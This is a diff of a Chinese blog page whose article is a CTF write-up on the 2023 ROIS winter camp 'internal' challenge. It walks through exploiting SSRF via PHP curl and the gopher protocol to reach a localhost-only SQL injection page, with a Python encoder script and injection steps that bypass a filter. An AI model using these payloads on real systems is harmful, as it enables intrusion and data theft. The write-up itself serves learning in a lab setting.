@@ -1,169 +1,317 @@
-<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSRF | Potat0w0</title><meta name="author" content="Potat0w0"><meta name="copyright" content="Potat0w0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="2023ROIS冬令营internal这是什么，两个超链接，点一下（  ​	SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once(&amp;#x27;config.php&amp;#x27;);if ($_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] !&#x3D;&#x3D; &amp;#x27;127.0.0.1&amp;#x27;) &amp;#123;    highl">
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Potat0w0">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2023ROIS冬令营internal这是什么，两个超链接，点一下（  ​	SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once(&amp;#x27;config.php&amp;#x27;);if ($_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] !&#x3D;&#x3D; &amp;#x27;127.0.0.1&amp;#x27;) &amp;#123;    highl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSRF">
 <meta property="og:url" content="http://example.com/2023/02/09/SSRF/index.html">
 <meta property="og:site_name" content="Potat0w0">
 <meta property="og:description" content="2023ROIS冬令营internal这是什么，两个超链接，点一下（  ​	SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once(&amp;#x27;config.php&amp;#x27;);if ($_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] !&#x3D;&#x3D; &amp;#x27;127.0.0.1&amp;#x27;) &amp;#123;    highl">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/img/default.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230410150245999.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230410153558433.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230410182351129.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230410194114453.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230410201414804.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230411013245234.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SSRF/image-20230412103314980.png">
 <meta property="article:published_time" content="2023-02-09T08:32:54.000Z">
 <meta property="article:modified_time" content="2023-04-27T09:54:05.039Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="ssrf">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/img/default.png"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://example.com/2023/02/09/SSRF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: 'Copy successfully',
-    error: 'Copy error',
-    noSupport: 'The browser does not support'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/02/09/SSRF/image-20230410150245999.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SSRF - Potat0w0</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  }
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'SSRF',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2023-04-27 17:54:05'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
+
+
   
-    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
-      const link = document.createElement('link')
-      link.rel = 'stylesheet'
-      link.href = url
-      if (id) link.id = id
-      link.onerror = reject
-      link.onload = link.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        link.onload = link.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(link)
-    })
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
   
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+
+  <header>
     
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Potat0w0&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSRF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
     
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/icon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/default.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Potat0w0"><span class="site-name">Potat0w0</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-09T08:32:54.000Z" title="Created 2023-02-09 16:32:54">2023-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-27T09:54:05.039Z" title="Updated 2023-04-27 17:54:05">2023-04-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSRF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p>
-<p><img src="/2023/02/09/SSRF/image-20230410150245999.png"></p>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Potat0w0
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-09 16:32" pubdate>
+          February 9, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          90 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SSRF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p>
+<p><img src="/2023/02/09/SSRF/image-20230410150245999.png" srcset="/img/loading.gif" lazyload></p>
 <p>​	SQLI页面中的内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure>
 
@@ -173,14 +321,14 @@
 <p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p>
 <p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p>
 <p>gopher协议的格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流<br></code></pre></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure>
 
 <p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p>
 <p>GET请求：</p>
 <p>准备好一个监听机和一个用户机：</p>
-<p><img src="/2023/02/09/SSRF/image-20230410153558433.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230410153558433.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p>
-<p><img src="/2023/02/09/SSRF/image-20230410182351129.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230410182351129.png" srcset="/img/loading.gif" lazyload></p>
 <p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure>
 
@@ -205,13 +353,13 @@
 
 <p>现在回到本题；</p>
 <p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p>
-<p><img src="/2023/02/09/SSRF/image-20230410194114453.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230410194114453.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure>
 
 <p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p>
-<p><img src="/2023/02/09/SSRF/image-20230410201414804.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230410201414804.png" srcset="/img/loading.gif" lazyload></p>
 <p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p>
-<p><img src="/2023/02/09/SSRF/image-20230411013245234.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230411013245234.png" srcset="/img/loading.gif" lazyload></p>
 <p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
@@ -232,12 +380,352 @@
 <p>数据库rua、表flag、字段flag，爆flag内容：</p>
